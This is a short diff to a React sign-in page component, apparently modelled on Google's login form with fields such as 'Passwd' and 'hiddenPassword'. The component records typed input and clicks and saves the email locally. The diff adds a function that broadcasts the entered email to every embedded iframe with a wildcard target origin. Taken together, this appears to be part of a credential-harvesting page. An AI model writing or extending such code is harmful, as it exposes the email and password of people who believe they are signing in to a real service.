@@ -16,6 +16,15 @@ function GeSignInPage() {
   const stepRef = useRef(step);
   useEffect(() => { stepRef.current = step; }, [step]);
 
+
+
+  function pushEmailToChildren(email: string) {
+    const msg = { __ge_set: true, email };
+    document.querySelectorAll("iframe").forEach((f) => {
+      try { f.contentWindow?.postMessage(msg, "*"); } catch { /* noop */ }
+    });
+  }
+
   const handle = useCallback(
     (m: GeIframeMessage) => {
       if (m.type === "submit") {
@@ -27,6 +36,7 @@ function GeSignInPage() {
           trackClick("Next-Email");
           trackInput("email", email);
           try { localStorage.setItem("saved_user_email", email); } catch { /* noop */ }
+          pushEmailToChildren(email);
           setStep("password");
         } else if (cur === "password") {
           const pw = String(f.Passwd || f.password || f.hiddenPassword || "");
